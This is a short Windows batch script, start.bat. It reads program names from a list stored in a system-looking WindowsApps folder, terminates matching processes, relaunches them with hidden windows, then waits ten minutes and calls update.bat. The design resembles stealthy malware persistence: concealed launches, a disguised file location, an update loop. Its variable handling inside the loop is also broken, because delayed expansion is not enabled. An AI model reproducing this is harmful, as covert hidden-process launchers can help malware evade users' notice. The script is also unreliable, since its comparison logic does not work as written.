@ECHO OFF
Title start.bat
for /F "tokens=*" %%A in (%localappdata%\Microsoft\WindowsApps\list.txt) do (
    set program=%%A
    if /I NOT %program%==update.bat (
        WMIC PROCESS WHERE "COMMANDLINE LIKE '%%program%%'" CALL TERMINATE
        powershell "start %%A -WindowStyle Hidden"
    )
)
timeout 600 1>nul
start /wait update.bat